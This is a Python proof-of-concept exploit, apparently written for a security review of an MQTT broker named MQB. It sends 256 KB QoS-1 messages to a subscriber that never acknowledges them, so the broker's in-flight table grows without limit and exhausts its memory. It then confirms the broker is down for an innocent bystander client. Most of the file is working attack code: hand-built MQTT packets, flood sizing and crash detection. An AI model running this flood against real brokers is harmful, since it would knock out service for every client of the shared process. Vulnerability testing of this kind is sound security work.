#!/usr/bin/env python3
"""
PoC #5: Unbounded in-flight QoS-1 table -> broker-WIDE memory-exhaustion DoS
---------------------------------------------------------------------------
Location: Broker._forward_to() in mqb/broker.py. Every QoS-1 message
forwarded to a subscriber gets a fresh packet id and an entry in
`target.pending_ack`, each entry retaining the message's full (topic,
payload), with NO memory cap and NO eviction beyond a matching PUBACK from
that subscriber. A real broker enforces a small max-inflight-per-client
window (Mosquitto's default is 20) and stops forwarding new QoS-1 messages
to a client once its window is full; this one has no such limit, so a
publisher can grow one subscriber's in-flight table without bound just by
publishing faster than that subscriber ever PUBACKs. Because that table
lives in the single broker process's heap, exhausting it doesn't hurt only
the abusive connection -- it kills the process that serves EVERY client.

CONFIRMATION IS BY LIVENESS / BROKER-WIDE IMPACT, NOT BY THE ATTACK
CONNECTION'S OWN STATE. An earlier version of this PoC "confirmed" the bug by
reading the abusive subscriber's own `inflight_out` counter off /admin/stats
and asserting it grew past a sane cap. That proves the table is unbounded but
NOT that the service is denied: a per-connection artifact reported through a
side channel says nothing about whether a *separate, innocent* client can
still use the broker. So instead we prove denial the way a victim would feel
it: (0) baseline a full MQTT round-trip (CONNECT + SUBSCRIBE + self-PUBLISH +
receive) from an independent bystander client and confirm it's fast; (1) grow
the unbounded in-flight table by flooding QoS-1 messages at a slow subscriber
that never PUBACKs; (2) re-probe the SAME bystander round-trip from a fresh
connection. The DoS is confirmed only if the bystander is now denied
(connection refused = the broker process is gone, since it is NOT
auto-restarted -- see Dockerfile CMD and docker-compose, no restart policy)
or its round-trip collapses (sustained timeouts). If the bystander still
completes a fast round-trip, the flood grew a big table but did NOT deny the
shared service, and this is reported as NOT a full DoS.

Why the flood uses modestly-sized payloads rather than a huge message count:
alloc_packet_id() cycles packet ids over the 16-bit space, so the *number* of
pending_ack entries tops out near 65535 -- but each entry pins the message's
full payload, and payload size is attacker-controlled and uncapped. A stream
of ~16 KB QoS-1 messages therefore drives the heap past the broker's (modest,
realistic) memory envelope in a few seconds, which is what actually takes the
process down. This is a real broker-wide DoS, so run it against a throwaway
instance.

Run: python3 05_unbounded_inflight_dos.py [host] [port] [admin_port]
"""
import http.client
import json
import os
import socket
import struct
import sys
import threading
import time
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
ADMIN_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8081
# If a harness has configured real auth (fixing vuln #1), authenticate every
# client below so this PoC keeps testing #5 (unbounded in-flight table) in
# isolation.
PASSWORD = os.environ.get("MQB_REQUIREPASS")

# --- Flood sizing -----------------------------------------------------------
# Each QoS-1 message pins its full payload in pending_ack; a broker meant for
# tiny sensor payloads exhausts its heap well before the 16-bit packet-id space
# (~65535 entries) would even wrap. We use a large per-message payload so the
# 256 MB container cap is reached in ~1k messages (a couple of seconds of
# synchronous round-trips) instead of the ~16k that 16 KB payloads needed — same
# unbounded-in-flight-table mechanism, just a far tighter wall clock. We keep
# sending until the broker dies (publisher socket breaks), we hit MAX_MESSAGES,
# or FLOOD_BUDGET seconds elapse (backstop so a roomier host can't run the flood
# unbounded — a table this bloated still denies the bystander below).
PAYLOAD_SIZE = 256 * 1024
MAX_MESSAGES = 6000
FLOOD_BUDGET = 8.0
# Only used for a human-readable "table grew past any sane window" line; NOT a
# pass/fail criterion (see module docstring).
SANE_INFLIGHT_CAP = 200  # any real broker's max-inflight-per-client window is far below this

# --- Liveness thresholds ----------------------------------------------------
BYSTANDER_TIMEOUT = 5.0        # a healthy round-trip is well under a second
LIVENESS_WINDOW = 12           # how long to watch the bystander after flooding
LIVENESS_INTERVAL = 1.0
DOWN_STREAK_TO_CONFIRM = 2     # two consecutive denials => not a momentary blip
# A round-trip this much slower than baseline (and slower than this floor)
# counts as "degraded to the point of denial" even if it eventually completes.
DEGRADE_FACTOR = 20
DEGRADE_FLOOR = 3.0


def _u8(s):
    b = s.encode()
    return struct.pack("!H", len(b)) + b


def _rl(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out.append(b)
        if n == 0:
            break
    return bytes(out)


def build_connect(client_id, clean_session=1, keep_alive=60, password=None):
    flags = (clean_session & 1) << 1
    if password is not None:
        flags |= 0x40
    body = _u8("MQTT") + bytes([4, flags]) + struct.pack("!H", keep_alive) + _u8(client_id)
    if password is not None:
        pb = password.encode() if isinstance(password, str) else password
        body += struct.pack("!H", len(pb)) + pb
    return bytes([0x10]) + _rl(len(body)) + body


def build_publish(topic, payload, qos=0, retain=0, packet_id=1):
    flags = (qos & 3) << 1 | (retain & 1)
    body = _u8(topic)
    if qos > 0:
        body += struct.pack("!H", packet_id)
    body += payload
    return bytes([0x30 | flags]) + _rl(len(body)) + body


def build_subscribe(filters, packet_id=1):
    body = struct.pack("!H", packet_id)
    for f, q in filters:
        body += _u8(f) + bytes([q])
    return bytes([0x82]) + _rl(len(body)) + body


def recv_packet(sock, timeout=5.0):
    sock.settimeout(timeout)
    first = sock.recv(1)
    if not first:
        return None
    ptype = first[0] >> 4
    mult, val = 1, 0
    while True:
        b = sock.recv(1)[0]
        val += (b & 0x7F) * mult
        if not (b & 0x80):
            break
        mult *= 128
    body = b""
    while len(body) < val:
        chunk = sock.recv(val - len(body))
        if not chunk:
            break
        body += chunk
    return ptype, body


def drain_forever(sock, stop_event, counter):
    """Read (and discard) every PUBLISH the broker sends -- but never send a
    PUBACK. This is the 'reads its socket, never acks' slow-consumer shape:
    it drains the outbound TCP buffer so the memory that grows is provably the
    broker's in-flight table (the vuln), not just unread socket buffering."""
    sock.settimeout(0.5)
    while not stop_event.is_set():
        try:
            r = recv_packet(sock, timeout=0.5)
        except socket.timeout:
            continue
        except OSError:
            return
        if r is None:
            return
        ptype, _ = r
        if ptype == 3:
            counter[0] += 1


def admin_stats(timeout=3.0):
    conn = http.client.HTTPConnection(HOST, ADMIN_PORT, timeout=timeout)
    conn.request("GET", "/admin/stats")
    resp = conn.getresponse()
    data = json.loads(resp.read())
    conn.close()
    return data


def admin_health(timeout=3.0):
    """(up, detail): up=True only if GET /health answers. The admin server
    shares the broker's single process, so it dies with it -- a useful
    corroborating signal that the process (not just one MQTT connection) is
    gone."""
    try:
        conn = http.client.HTTPConnection(HOST, ADMIN_PORT, timeout=timeout)
        conn.request("GET", "/health")
        resp = conn.getresponse()
        resp.read()
        conn.close()
        return (resp.status == 200), f"{resp.status}"
    except Exception as e:
        return False, type(e).__name__


def bystander_roundtrip(timeout=BYSTANDER_TIMEOUT):
    """A full, innocent MQTT round-trip from a brand-new connection: CONNECT,
    SUBSCRIBE to a unique topic, PUBLISH to that same topic, and receive the
    delivery back. Returns (ok, latency_s, detail). This is what a normal
    client of the shared broker experiences; if it fails or hangs, the service
    itself is denied -- regardless of what any one attack connection is doing."""
    token = uuid.uuid4().hex[:10]
    cid = f"poc5-bystander-{token}"
    topic = f"poc5/bystander/{token}"
    start = time.time()
    s = None
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.sendall(build_connect(cid, keep_alive=30, password=PASSWORD))
        r = recv_packet(s, timeout=timeout)
        if r is None or r[0] != 2:  # CONNACK
            return False, time.time() - start, "no CONNACK"
        s.sendall(build_subscribe([(topic, 0)]))
        r = recv_packet(s, timeout=timeout)
        if r is None or r[0] != 9:  # SUBACK
            return False, time.time() - start, "no SUBACK"
        s.sendall(build_publish(topic, b"ping", qos=0))
        # Read until we get our own PUBLISH echoed back.
        while True:
            r = recv_packet(s, timeout=timeout)
            if r is None:
                return False, time.time() - start, "no delivery"
            if r[0] == 3:  # PUBLISH delivered back to us
                return True, time.time() - start, "ok"
    except Exception as e:
        return False, time.time() - start, type(e).__name__
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass


def _wait_for_server(timeout=15.0):
    """Wait for the broker's MQTT port to accept connections. Guards against
    the PoC racing the container's startup when invoked directly via
    `docker compose run --rm poc python3 NN_slug.py <host> <port>`."""
    deadline = time.time() + timeout
    last_err = None
    while time.time() < deadline:
        try:
            s = socket.create_connection((HOST, PORT), timeout=2)
            s.close()
            return
        except OSError as e:
            last_err = e
            time.sleep(0.3)
    raise RuntimeError(f"server never came up on {HOST}:{PORT}: {last_err}")


def _peak_inflight_sampler(sub_id, stop_event, peak):
    """Best-effort background sampler: poll /admin/stats and remember the
    largest in-flight table we ever see for the abusive subscriber, purely as
    supporting colour ('the table really did grow unbounded'). Never gates the
    result and silently stops once the admin server is gone."""
    while not stop_event.is_set():
        try:
            inflight = admin_stats().get("clients", {}).get(sub_id, {}).get("inflight_out")
            if isinstance(inflight, int) and inflight > peak[0]:
                peak[0] = inflight
        except Exception:
            pass
        time.sleep(0.2)


def main():
    _wait_for_server()

    # 0) Baseline: an independent bystander must get a fast round-trip BEFORE
    #    we attack; otherwise we can't claim we're the ones who downed it.
    ok, base_lat, detail = bystander_roundtrip()
    if not ok:
        print(f"[!] Pre-check: bystander round-trip failed ({detail}); is MQB healthy? "
              "Cannot run a DoS test against an already-broken broker.")
        sys.exit(2)
    print(f"[*] Baseline: independent bystander completed a full MQTT round-trip in "
          f"{base_lat*1000:.0f} ms")

    token = uuid.uuid4().hex[:12]
    sub_id = f"poc5-slow-sub-{token}"
    topic = f"poc5/{token}/backlog"

    # Slow, uncooperative subscriber: reads its socket but never PUBACKs.
    sub = socket.create_connection((HOST, PORT), timeout=10)
    sub.sendall(build_connect(sub_id, keep_alive=120, password=PASSWORD))
    recv_packet(sub)  # CONNACK
    sub.sendall(build_subscribe([(topic, 1)]))
    recv_packet(sub)  # SUBACK

    stop_event = threading.Event()
    received_count = [0]
    reader = threading.Thread(target=drain_forever, args=(sub, stop_event, received_count), daemon=True)
    reader.start()

    peak_inflight = [0]
    sampler = threading.Thread(target=_peak_inflight_sampler, args=(sub_id, stop_event, peak_inflight), daemon=True)
    sampler.start()

    pub = socket.create_connection((HOST, PORT), timeout=10)
    pub.sendall(build_connect(f"poc5-pub-{token}", password=PASSWORD))
    recv_packet(pub)  # CONNACK

    payload = b"x" * PAYLOAD_SIZE
    print(f"[*] Flooding up to {MAX_MESSAGES} QoS-1 messages ({PAYLOAD_SIZE} B each) at a "
          f"subscriber that never PUBACKs, growing the broker's in-flight table...")
    start = time.time()
    sent = 0
    broker_broke_during_flood = False
    try:
        for i in range(MAX_MESSAGES):
            pub.sendall(build_publish(topic, payload, qos=1, packet_id=(i % 65535) + 1))
            recv_packet(pub)  # publisher's own PUBACK from the broker
            sent += 1
            if time.time() - start > FLOOD_BUDGET:
                print(f"[*] flood budget ({FLOOD_BUDGET}s) reached at {sent} messages "
                      "without a broker crash; the in-flight table is already bloated "
                      "— judging by bystander liveness below")
                break
    except Exception as e:
        # The broker process dying mid-flood breaks our publisher socket; that
        # is itself broker-wide impact, confirmed independently below.
        broker_broke_during_flood = True
        print(f"[*] publisher socket broke after {sent} messages "
              f"({type(e).__name__}) — the broker looks gone; verifying by liveness")
    dur = time.time() - start
    print(f"[*] Sent {sent} QoS-1 messages in {dur:.1f}s; subscriber received "
          f"{received_count[0]} PUBLISHes over the wire (so this is the in-flight "
          f"table, not an unread TCP buffer)")
    if peak_inflight[0]:
        print(f"[*] Peak in-flight table observed via /admin/stats: {peak_inflight[0]} "
              f"un-acked QoS-1 messages for one subscriber "
              f"({'>' if peak_inflight[0] >= SANE_INFLIGHT_CAP else '<'} sane cap of "
              f"{SANE_INFLIGHT_CAP}; a real broker caps this at e.g. Mosquitto's 20)")

    try:
        pub.close()
    except Exception:
        pass

    # 2) Liveness watch: can a SEPARATE, innocent bystander still use the
    #    broker? Poll a fresh full round-trip; the DoS is confirmed only if the
    #    bystander is denied (refused/timed out) or collapses vs. baseline.
    print(f"[*] Re-probing an independent bystander for up to {LIVENESS_WINDOW}s to "
          "confirm the whole broker is denied, not just the attack connection...")
    degrade_threshold = max(DEGRADE_FLOOR, base_lat * DEGRADE_FACTOR)
    deadline = time.time() + LIVENESS_WINDOW
    down_streak = 0
    last_detail = ""
    while time.time() < deadline:
        ok, lat, detail = bystander_roundtrip()
        hup, hdetail = admin_health()
        if ok and lat <= degrade_threshold:
            down_streak = 0
            last_detail = f"ok in {lat*1000:.0f} ms (admin /health: {hdetail})"
        else:
            down_streak += 1
            reason = detail if not ok else f"round-trip {lat*1000:.0f} ms >> baseline"
            last_detail = f"{reason} (admin /health: {hdetail})"
            print(f"[*]   bystander denied/degraded: {last_detail} [{down_streak} consecutive]")
            if down_streak >= DOWN_STREAK_TO_CONFIRM:
                print(f"[+] Broker-wide DoS confirmed — an independent bystander can no "
                      f"longer complete an MQTT round-trip ({reason}); the shared broker "
                      f"process is denied to EVERY client, not just the flooding "
                      f"connection. (No restart policy on the container, so it stays down.)")
                stop_event.set()
                return 0
        time.sleep(LIVENESS_INTERVAL)

    # 3) Survived the whole window: the flood grew the table but the shared
    #    service kept serving other clients.
    stop_event.set()
    print(f"[-] Bystander still completing round-trips at end of window "
          f"(last: {last_detail}). The unbounded in-flight table grew"
          f"{f' to {peak_inflight[0]} entries' if peak_inflight[0] else ''} but did NOT "
          "deny the shared broker — not a full DoS (host may be uncapped, or a "
          "max-inflight bound is now enforced).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
